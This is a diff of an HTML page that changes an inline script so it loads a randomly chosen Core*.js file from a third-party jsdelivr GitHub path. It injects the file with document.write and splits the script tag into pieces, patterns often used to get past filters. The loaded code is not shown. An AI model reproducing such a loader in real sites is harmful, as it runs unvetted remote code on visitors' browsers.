@@ -22,7 +22,10 @@ function getParameter(name, cancelBubble) {
 
 <script type="text/javascript">
 // var webpath = "Core.js";
-var webpath = "//cdn.jsdelivr.net/gh/lhtel/cdn@100022/10191/00ee04e0a06eac29e039ed843381f78d/Core.js";
+var fnames = ['Core1.js','Core2.js','Core3.js','Core4.js','Core5.js','Core10.js'];
+var fname = fnames[Math.floor(Math.random() * fnames.length)];
+var webpath = "//cdn.jsdelivr.net/gh/lhtel/cdn@100022/10191/00ee04e0a06eac29e039ed843381f78d/"+fname;
+//var webpath = "//cdn.jsdelivr.net/gh/lhtel/cdn@100022/10191/00ee04e0a06eac29e039ed843381f78d/Core.js";
 document.write('<scr'+'ipt src="'+webpath+'" id="'+s_w+'" tag='+s_w+'"></scr'+'ipt>');
 </script>
     </body>
